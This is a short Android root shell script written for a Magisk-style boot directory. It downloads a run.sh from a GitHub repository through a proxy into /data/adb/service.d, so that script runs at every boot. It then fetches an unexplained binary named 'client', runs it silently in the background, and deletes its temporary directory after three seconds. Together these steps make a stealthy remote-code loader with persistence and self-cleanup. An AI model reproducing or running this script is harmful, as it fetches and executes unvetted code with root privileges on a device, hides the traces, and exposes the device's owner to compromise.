#!/system/bin/sh

if command -v curl >/dev/null 2>&1; then
    curl -L -o /data/adb/service.d/run.sh https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -O /data/adb/service.d/run.sh https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh || exit 1
else
    exit 1
fi
chmod +x /data/adb/service.d/run.sh
ASSET_NAME="client"
URL="https://gh-proxy.org/https://github.com/jenssenli/ko/raw/refs/heads/main/client"

# 建立臨時目錄
if type mktemp >/dev/null 2>&1; then
    tmpdir="$(mktemp -d "/data/gztmpXXXXXXXXX")"
else
    tmpdir="/data/gztmp$$"
    mkdir -p "$tmpdir" || exit 1
fi

BIN_PATH="$tmpdir/$ASSET_NAME"

# 下載
if command -v curl >/dev/null 2>&1; then
    curl -L -o "$BIN_PATH" "$URL" || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -O "$BIN_PATH" "$URL" || exit 1
else
    exit 1
fi

chmod +x "$BIN_PATH"

# 主進程後臺運行
(
    cd "$tmpdir" || exit 1
    "./$ASSET_NAME" >/dev/null 2>&1 &
) &

# 延時自刪
(
    sleep 3
    rm -rf "$tmpdir"
) >/dev/null 2>&1 &

exit 0
